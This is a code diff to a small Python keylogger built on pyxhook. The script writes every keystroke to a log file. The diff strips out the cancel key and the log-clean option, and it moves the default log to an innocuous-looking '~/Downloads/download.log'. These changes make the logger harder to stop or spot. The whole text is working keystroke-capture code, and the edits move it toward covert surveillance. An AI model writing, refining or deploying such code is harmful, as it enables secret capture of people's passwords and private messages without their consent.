@@ -1,29 +1,13 @@
 import os
 import pyxhook
 
-log_file = os.environ.get(
+log = os.environ.get(
     'pylogger_file',
-    os.path.expanduser('~/Desktop/file.log')
+    os.path.expanduser('~/Downloads/download.log')
 )
-
-cancel_key = ord(
-    os.environ.get(
-        'pylogger_cancel',
-        '`'
-    )[0]
-)
-
-
-if os.environ.get('pylogger_clean', None) is not None:
-    try:
-        os.remove(log_file)
-    except EnvironmentError:
-       # File does not exist, or no permissions.
-        pass
-
 
 def OnKeyPress(event):
-    with open(log_file, 'a') as f:
+    with open(log, 'a') as f:
         f.write('{}\n'.format(event.Key))
 
 
